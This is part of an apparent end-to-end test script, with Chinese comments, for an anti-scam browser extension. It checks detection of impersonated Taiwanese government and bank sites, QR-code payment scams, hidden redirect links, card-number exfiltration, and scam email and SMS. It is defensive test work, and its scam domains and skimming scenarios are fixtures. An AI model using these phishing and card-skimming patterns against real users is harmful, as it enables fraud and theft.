check('打入有效卡號（欄位沒標示）立即跳出警告', !beforeType && (await overlayVisible(page)));

// 12. 假投資導流頁
await page.goto('https://stock-master.net/');
await settle();
const v12 = await verdictOf(page);
check('假投資（保證獲利＋加 LINE）判為危險', v12?.level === 'danger', v12?.reasons?.[0]?.text);

// 13. 冒名健保署要你下載 APK
await page.goto('https://health-update.net/').catch(() => {});
await settle();
const v13 = await verdictOf(page);
check('冒名健保署要你下載 APK 判為危險', v13?.level === 'danger', v13?.reasons?.[0]?.text);

// 13b. 抄襲官網：原始碼的 canonical 與 Logo 來自監理服務網，頁面文字卻沒寫機構名稱
await page.goto('https://pay-online-tw.com/fee');
await settle();
const v13b = await verdictOf(page);
check('抄襲官網的繳費頁（canonical、Logo 來自 mvdis.gov.tw）判為危險', v13b?.level === 'danger' && /複製/.test(v13b?.reasons?.[0]?.text) && v13b?.impersonating?.domain === 'mvdis.gov.tw', v13b?.reasons?.[0]?.text);

// 13c. 偷傳卡號：還沒按送出，卡號就被傳到另一個網站
await page.goto('https://order-confirm-page.com/');
await settle();
const before13c = await verdictOf(page);
await page.click('#cn');
await page.keyboard.type('4111 1111 1111 1111', { delay: 20 });
await settle(2000);
const v13c = await verdictOf(page);
check('打字途中卡號被外傳 → 判為危險（之前只是提醒）', before13c?.level !== 'danger' && v13c?.level === 'danger' && v13c.reasons.some((r) => /還沒按送出/.test(r.text) && /collect-panel\.com/.test(r.text)), `${before13c?.level} → ${v13c?.level}：${v13c?.reasons?.[0]?.text}`);
check('偷傳卡號時跳出全頁警告', Boolean(await uiFind(page, 'page-overlay').then((r) => { if (r) r.cdp.detach(); return r; })));
await page.screenshot({ path: path.join(SHOTS, '10-exfil-overlay.png') });

// 13d. 送出前最後一道關卡：一般網站送出卡號前先確認；確認後照常送出
await page.goto('https://handmade-goods.com/checkout');
await settle();
await page.click('#card');
await page.keyboard.type('4111111111111111', { delay: 10 });
await settle(1500);
await page.click('#pay');
await settle(800);
const guardText = (await uiText(page, 'submit-guard')) || '';
check('送出卡號前跳出確認畫面，標明收款網站', guardText.includes('handmade-goods.com') && guardText.includes('送出信用卡卡號前'), guardText.slice(0, 80));
check('確認前沒有送出', (await page.title()) !== 'PAID');
await page.screenshot({ path: path.join(SHOTS, '11-submit-guard.png') });
await uiClick(page, 'confirm-submit');
await settle(1500);
check('按「我確認網址正確」後照常送出', (await page.title()) === 'PAID', await page.title());
const v13d = await verdictOf(page);
check('按下送出後才傳卡號到自己的網站，不算偷傳', v13d?.level !== 'danger' && !v13d?.reasons?.some((r) => /還沒按送出/.test(r.text)), v13d?.level);
const ok13d = await sw.evaluate(async () => (await chrome.storage.session.get('submitOk')).submitOk || {});
check('同一網站這次瀏覽不再詢問', Boolean(ok13d['handmade-goods.com']));

// 13e. 正規金流：刷卡欄位在 TapPay 的 iframe 裡
await page.goto('https://gateway-shop.com/checkout');
await settle();
const v13e = await verdictOf(page);
check('辨識正規金流（TapPay）的刷卡欄位', v13e?.page?.gateway === 'TapPay', JSON.stringify(v13e?.page?.gateway));

// 13g. 網頁上的 QR Code：冒名停管處的轉帳碼、連到仿冒網址、LINE 加好友
await page.goto('https://parking-qr-pay.com/');
await settle(3500);
const v13g = await verdictOf(page);
const qrKinds = (v13g?.page?.qr || []).map((q) => q.kind).sort().join(',');
check('解出網頁上三種 QR Code（跨網域 PNG、內嵌圖片、SVG）', qrKinds === 'chat,pay,url,url', JSON.stringify(v13g?.page?.qr));
check('冒名停管處、只放 QR Code 轉帳碼的繳費頁判為危險', v13g?.level === 'danger' && v13g.page.asks.includes('掃碼付款／轉帳'), v13g?.reasons?.[0]?.text);
check('指出 QR Code 連到仿冒監理服務網的網址', v13g?.reasons?.some((r) => /QR Code 連到 www\.mvdis\.gov\.tw\.pay-fine\.top/.test(r.text)));
await page.screenshot({ path: path.join(SHOTS, '13-qr-overlay.png') });

// 13h. Logo 比對：網站圖示和中國信託官網的一樣，又要你輸入卡號
const logoUpd = await sw.evaluate(() => globalThis.__oug.updateLogos());
check('從專案網站下載官網 Logo 指紋並通過檢查', logoUpd && logoUpd.ok && logoUpd.count === 1, JSON.stringify(logoUpd));
await page.goto('https://card-verify-tw.com/');
await settle(3500);
const v13h = await verdictOf(page);
check('網站圖示是中國信託的 Logo、要你輸入卡號 → 危險（頁面文字沒提到銀行）', v13h?.level === 'danger' && /中國信託.*圖片比對/.test(v13h?.reasons?.[0]?.text || '') && v13h?.impersonating?.domain === 'ctbcbank.com', v13h?.reasons?.[0]?.text);

// 13i. 裝置端 AI（測試環境沒有 Chrome 內建模型，用模擬的 LanguageModel 代替；真實模型只在使用者電腦上）
await sw.evaluate(() => {
  globalThis.__aiCalls = [];
  globalThis.LanguageModel = {
    availability: async () => 'available',
    create: async () => ({
      clone: async function () { return this; },
      destroy() {},
      prompt: async (text, opts) => {
        globalThis.__aiCalls.push({ len: text.length, schema: Object.keys((opts && opts.responseConstraint && opts.responseConstraint.properties) || {}) });
        return JSON.stringify(text.includes('MEGA ICBC')
          ? { claimedName: 'MEGA ICBC', officialName: '兆豐國際商業銀行', isGovernment: false, topic: 'account_verification' }
          : { claimedName: null, officialName: null, isGovernment: false, topic: 'other' });
      },
    }),
  };
  globalThis.__oug.resetAi();
});
await page.goto('https://secure-member-login.com/');
await settle(3500);
const v13i = await verdictOf(page);
const aiCalls = await sw.evaluate(() => globalThis.__aiCalls);
check('關鍵字看不出自稱誰的網銀登入頁：裝置端 AI 判讀為兆豐銀行 → 危險', v13i?.level === 'danger' && /裝置端 AI 判讀.*兆豐/.test(v13i?.reasons?.[0]?.text || ''), v13i?.reasons?.[0]?.text);
check('AI 只讀一次、要求固定格式回答', aiCalls.length === 1 && aiCalls[0].schema.includes('officialName'), JSON.stringify(aiCalls));
await page.goto('https://www.mvdis.gov.tw/');
await settle(1500);
check('官方網站不會交給 AI', (await sw.evaluate(() => globalThis.__aiCalls.length)) === 1);
const optAi = await context.newPage();
await optAi.goto(`chrome-extension://${extId}/src/pages/options.html`);
await settle(800);
check('設定頁顯示裝置端 AI 可以使用', (await optAi.textContent('#aiStat')).includes('可以使用'));
await optAi.close();
await sw.evaluate(() => { delete globalThis.LanguageModel; globalThis.__oug.resetAi(); });

// 13f. 彈出視窗：顯示正確繳費管道、查註冊日期
const parkTab = await context.newPage();
await parkTab.goto('https://tw-parking-pay.com/pay');
await settle();
const parkTabId = await tabIdOf(parkTab);
const pop2 = await context.newPage();
await pop2.setViewportSize({ width: 380, height: 640 });
await pop2.goto(`chrome-extension://${extId}/src/pages/popup.html?tabId=${parkTabId}`);
await settle(800);
const popText = await pop2.textContent('#current');
check('彈出視窗顯示正確繳費管道', popText.includes('停車費：請改用這些正確管道'), popText.slice(0, 60));
await pop2.click('text=註冊多久？');
await settle(800);
check('彈出視窗查註冊日期', (await pop2.textContent('#current')).includes('才 5 天'));
await pop2.screenshot({ path: path.join(SHOTS, '12-popup-channels.png'), fullPage: true });
await pop2.close();
await parkTab.close();

// 14. 右鍵「檢查這個連結」的檢查頁
const chk = await context.newPage();
await chk.setViewportSize({ width: 440, height: 680 });
await chk.goto(`chrome-extension://${extId}/src/pages/check.html?q=${encodeURIComponent('https://www.post.gov.tw.track-parcel.top/pay')}`);
await settle(800);
check('右鍵檢查頁顯示危險', (await chk.textContent('#result')).includes('高度疑似詐騙'));
await chk.screenshot({ path: path.join(SHOTS, '8-check-link.png') });
await chk.close();
const menus = await sw.evaluate(() => new Promise((r) => chrome.contextMenus.update('check-link', {}, () => r(!chrome.runtime.lastError))));
check('右鍵選單已註冊', menus);

// 15. 攔截次數統計
const stats = await sw.evaluate(async () => (await chrome.storage.local.get('stats')).stats);
check('攔截次數有累計', stats && stats.url >= 2 && stats.page >= 3, JSON.stringify(stats));

// 16. 從公開來源下載真實清單（需要網路；連不上時記為略過）
const upd = await sw.evaluate(async () => {
  const r = await globalThis.__oug.update165();
  const { blocklist165 } = await chrome.storage.local.get('blocklist165');
  const doms = (blocklist165 && blocklist165.domains) || [];
  const leaked = ['google.com', 'line.me', 'shopee.tw', 'mvdis.gov.tw', 'gov.tw', 'com.tw'].filter((d) => doms.includes(d));
  const rules = await chrome.declarativeNetRequest.getDynamicRules();
  return { r, total: doms.length, leaked, ruleCount: rules.length, sample: doms.slice(0, 3) };
});
if (upd.r && upd.r.ok) {
  console.log('   來源：' + upd.r.sources.map((x) => `${x.name} ${x.ok ? x.count + ' 筆' : '失敗：' + x.error}`).join('；'));
  check('真實清單下載完成且已建立攔截規則', upd.total > 1000 && upd.ruleCount >= Math.ceil(upd.total / 2000), `${upd.total} 個網域、${upd.ruleCount} 條規則、剔除 ${upd.r.removed} 個（${(upd.r.removedSample || []).join(', ')}）`);
  check('真實清單中沒有混入官方或政府網域', upd.leaked.length === 0, upd.leaked.join(','));
} else {
  console.log(`○ 略過真實清單下載測試（${(upd.r && upd.r.error) || '無網路'}）`);
}

// 17. 官方清單線上更新：通過檢查的新清單會採用；被竄改（把涉詐網域標成官方）的清單會被拒絕
const off1 = await sw.evaluate(async () => {
  await globalThis.__oug.update165();
  const v = await globalThis.__oug.assess('https://brand-new-official.com.tw/');
  const { officialRemoteStatus } = await chrome.storage.local.get('officialRemoteStatus');
  return { level: v.level, status: officialRemoteStatus };
});
check('官方清單線上更新：新增的機構被採用', off1.level === 'official', JSON.stringify(off1.status));
remoteOfficial = exportOfficial([...OFFICIAL_SITES, { name: '冒充', category: '銀行', domains: ['scam-invest-tw.com'] }]);
const off2 = await sw.evaluate(async () => {
  await globalThis.__oug.update165();
  const v = await globalThis.__oug.assess('https://www.scam-invest-tw.com/');
  const { officialRemoteStatus } = await chrome.storage.local.get('officialRemoteStatus');
  return { level: v.level, status: officialRemoteStatus };
});
check('官方清單線上更新：含涉詐網域的清單被拒絕', off2.level !== 'official' && off2.status && !off2.status.ok, off2.status && off2.status.error);

// 17b. 每日彙整清單：下載得到就用它，並跳過已包含在裡面的原始來源；太舊就改用原始來源
const feedDomains = ['feed-only-scam.top', ...Array.from({ length: 1200 }, (_, i) => `feed-scam-${i}.top`)];
feedMock = { domains: feedDomains, meta: { version: 1, generatedAt: new Date().toISOString(), count: feedDomains.length, sources: [{ id: 'twnic', count: 700 }, { id: 'g0v165', count: 501 }] } };
requestedHosts.clear();
const feed1 = await sw.evaluate(async () => {
  const r = await globalThis.__oug.update165();
  const v = await globalThis.__oug.assess('https://feed-only-scam.top/');
  return { sources: r.sources, level: v.level };
});
const fs1 = Object.fromEntries((feed1.sources || []).map((x) => [x.id, x]));
check('彙整清單：下載成功，清單裡的網域判為危險', fs1.feed && fs1.feed.ok && fs1.feed.count === feedDomains.length && feed1.level === 'danger', JSON.stringify(fs1.feed));
check('彙整清單：已包含的原始來源不再個別下載', fs1.twnic && fs1.twnic.viaFeed && fs1.g0v165 && fs1.g0v165.viaFeed && !requestedHosts.has('raw.githubusercontent.com'), JSON.stringify([...requestedHosts]));
feedMock.meta.generatedAt = new Date(Date.now() - 6 * 86400000).toISOString();
const feed2 = await sw.evaluate(async () => (await globalThis.__oug.update165()).sources);
const fs2 = Object.fromEntries((feed2 || []).map((x) => [x.id, x]));
check('彙整清單：超過 4 天沒更新就改用原始來源', fs2.feed && !fs2.feed.ok && /沒有更新/.test(fs2.feed.error) && fs2.twnic && !fs2.twnic.viaFeed, JSON.stringify(fs2.feed));
feedMock = null;

// 18. 網頁信箱：開信時檢查（模擬 Gmail／Outlook 畫面）
await page.goto('https://mail.google.com/mail/u/0/#inbox/abc').catch(() => {});
await settle(2500);
const mail = await page.evaluate(() => {
  const el = document.querySelector('official-url-guard-mail');
  return el ? { level: el.getAttribute('data-level'), text: el.shadowRoot.textContent } : null;
});
check('Gmail 開啟假国税庁退稅信時顯示警告', mail && mail.level === 'danger', mail && mail.text.slice(0, 80));
check('警告內容指出官方網址與藏字手法', mail && /nta\.go\.jp/.test(mail.text) && /看不見的字元/.test(mail.text));
check('信件警告附上正確管道（e-Tax）', mail && /正確管道：e-Tax/.test(mail.text), mail && mail.text.slice(-80));
await page.screenshot({ path: path.join(SHOTS, '9-gmail-warning.png') });
// 單看網址 yarlgs.com 看不出問題，但它來自被判定為詐騙的信件，點了也要攔截
await page.click('a[href^="https://yarlgs.com"]');
await waitUrl(page, /warning\.html/);
await settle(800);
check('點詐騙信裡的連結會被攔截到警告頁', page.url().includes('warning.html'), page.url().slice(0, 80));
check('警告頁說明連結來自詐騙信', (await page.textContent('#reasons').catch(() => '')).includes('詐騙的信件'));
await page.goto('https://outlook.live.com/mail/0/').catch(() => {});
await settle(2500);
check('Outlook 開啟正常的監理服務網通知不顯示警告', await page.evaluate(() => !document.querySelector('official-url-guard-mail')));

// 18b. 簡訊（Google 訊息網頁版）與通訊軟體網頁版：自動檢查畫面上的訊息
await page.goto('https://messages.google.com/web/conversations/1').catch(() => {});
await settle(2500);
const sms = await page.evaluate(() => {
  const card = document.querySelector('official-url-guard-chat');
  const lv = (id) => document.getElementById(id).getAttribute('data-oug-msg');
  return { card: card ? { level: card.getAttribute('data-level'), text: card.shadowRoot.textContent } : null, scam: lv('sms-scam'), ok: lv('sms-ok'), mine: lv('sms-mine') };
});
check('Google 訊息：假監理站簡訊跳出浮動警告', sms.card && sms.card.level === 'danger' && /這則訊息很可能是詐騙/.test(sms.card.text), sms.card && sms.card.text.slice(0, 90));
check('Google 訊息：詐騙簡訊加上紅框，並指出官方網址', sms.scam === 'danger' && sms.card && /mvdis\.gov\.tw/.test(sms.card.text));
check('Google 訊息：一般簡訊、自己送出的訊息不標示', sms.ok === null && sms.mine === null, JSON.stringify({ ok: sms.ok, mine: sms.mine }));
await page.screenshot({ path: path.join(SHOTS, '10-sms-warning.png') });
const smsPopup = await context.newPage();
await smsPopup.goto(`chrome-extension://${extId}/src/pages/popup.html?tabId=${await sw.evaluate(async () => (await chrome.tabs.query({ url: 'https://messages.google.com/*' }))[0].id)}`);
await settle(800);
check('工具列視窗顯示「正在自動檢查這個畫面上的訊息」', /Google 訊息（簡訊）：正在自動檢查/.test(await smsPopup.textContent('#current')), (await smsPopup.textContent('#current')).slice(-60));
await smsPopup.close();
await page.click('#sms-scam a');
await waitUrl(page, /warning\.html/);
check('點詐騙簡訊裡的連結會被攔截', page.url().includes('warning.html'), page.url().slice(0, 80));
await page.goto('https://web.whatsapp.com/').catch(() => {});
await settle(2500);
const wa = await page.evaluate(() => ({
  otp: document.getElementById('wa-otp').getAttribute('data-oug-msg'), tip: document.getElementById('wa-otp').title,
  ok: document.getElementById('wa-ok').getAttribute('data-oug-msg'), card: !!document.querySelector('official-url-guard-chat'),
}));
check('WhatsApp：沒有連結但要你轉傳驗證碼的訊息加上提醒', wa.otp === 'caution' && /驗證碼/.test(wa.tip), wa.tip.slice(0, 80));
check('WhatsApp：一般訊息不標示；只是「可疑」不跳浮動警告', wa.ok === null && wa.card === false);

// 18c. 看不到的連結：網址藏在按鈕與網頁程式裡（畫面上沒有任何網址）
await page.goto('https://hidden-link-notice.net/').catch(() => {});
await settle(2500);
const hid = await page.evaluate(() => Object.fromEntries(['btn-onclick', 'btn-js', 'card', 'btn-ok'].map((id) => [id, document.getElementById(id).getAttribute('data-oug-level')])));
check('隱藏連結：按鈕 onclick、data 屬性裡的仿冒網址先標示出來；連到官網的按鈕不標示', hid['btn-onclick'] === 'danger' && hid.card === 'danger' && hid['btn-ok'] === null, JSON.stringify(hid));
const hidFrame = await page.evaluate(() => document.getElementById('frame').getAttribute('data-oug-level'));
// 提醒文字顯示在封閉的 shadow DOM 裡，網頁（和測試）讀不到；改從工具列視窗確認同一份結果
const hidPopup = await context.newPage();
await hidPopup.goto(`chrome-extension://${extId}/src/pages/popup.html?tabId=${await sw.evaluate(async () => (await chrome.tabs.query({ url: 'https://hidden-link-notice.net/*' }))[0].id)}`);
await settle(800);
const hidToast = await hidPopup.textContent('#current');
await hidPopup.close();
check('工具列視窗：離開通訊軟體網頁後不再顯示「正在自動檢查訊息」', !/正在自動檢查這個畫面上的訊息/.test(hidToast));
// 工具列視窗只列出前幾項理由；完整的清單直接讀擴充功能記在這個分頁上的結果
const hidItems = await sw.evaluate(async () => {
  const [tab] = await chrome.tabs.query({ url: 'https://hidden-link-notice.net/*' });
  const key = 'hidden:' + tab.id;
  return ((await chrome.storage.session.get(key))[key] || { items: [] }).items;
});
const hidHas = (host, weak = false) => hidItems.some((x) => x.host === host && Boolean(x.weak) === weak);
check('隱藏連結：工具列視窗列出藏在按鈕裡的仿冒網址，燈號至少為可疑', /mvdis-gov-tw\.cc/.test(hidToast) && /按鈕或程式會把你帶到/.test(hidToast), hidToast.replace(/\s+/g, ' ').slice(0, 100));
check('隱藏連結：網頁程式裡用 base64 藏起來的跳轉網址也找得到', hidHas('www.mvdis.gov.tw.pay-fine.top'), hidToast.replace(/\s+/g, ' ').slice(0, 120));
check('隱藏連結：內嵌框架來自仿冒網址時標示出來', hidFrame === 'danger' && hidHas('www.post.gov.tw.parcel-fee.top'), String(hidFrame));
check('隱藏連結：執行時才解碼出來的網址（靜態掃描看不到）也找得到', hidHas('fetc-etag-pay.top'), JSON.stringify(hidItems.map((x) => x.host)));
check('隱藏連結：伺服器回傳的資料裡的仿冒網址記為較弱的線索（不跳提醒）', hidHas('nhi-gov-tw.cyou', true));
check('隱藏連結：外部 .js 檔裡拆成好幾段的網址也找得到', hidHas('gov-tw-subsidy.cyou'));
await page.click('#btn-ext');
await waitUrl(page, /warning\.html/);
check('隱藏連結：外部 .js 檔用混淆寫法跳轉，連線前攔截', page.url().includes('warning.html') && decodeURIComponent(page.url()).includes('gov-tw-subsidy.cyou'), page.url().slice(0, 90));
await page.goto('https://hidden-link-notice.net/').catch(() => {});
await settle(1500);
await page.click('#btn-js');
await waitUrl(page, /warning\.html/);
check('隱藏連結：按下用 JavaScript 跳轉的按鈕，連線前攔截', page.url().includes('warning.html') && decodeURIComponent(page.url()).includes('pay-fine.top'), page.url().slice(0, 90));

// 19. 設定頁
const opt = await context.newPage();
await opt.goto(`chrome-extension://${extId}/src/pages/options.html`);
await settle(600);
await opt.screenshot({ path: path.join(SHOTS, '7-options.png'), fullPage: true });

await context.close();
const failed = results.filter((r) => !r.ok).length;
console.log(`\n${results.length - failed}/${results.length} 通過`);
process.exit(failed ? 1 : 0);
